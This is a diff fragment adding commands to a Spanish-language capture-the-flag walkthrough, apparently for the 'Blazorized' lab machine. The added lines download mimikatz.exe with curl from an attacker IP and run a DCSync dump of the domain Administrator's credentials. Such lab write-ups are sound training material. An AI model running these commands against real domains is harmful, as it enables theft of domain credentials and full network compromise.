@@ -303,5 +303,10 @@ almacenarse en subcarpetas de la carpeta Netlogon [Info](https://learn.microsoft
 Así que necesitamos descubrir cómo usar el mismo archivo bat, pero hay un problema. no tenemos suficientes permisos
 
 ```python
+curl 10.10.14.54:80/mimikatz.exe -o mimikatz.exe
+.\mimikatz.exe lsadump::dcsync /domain:blazorized.htb /user:Administrator > output.txt
+
+--------------------------------------------------------------------------------------------------------------------------------------
+
 
 ```
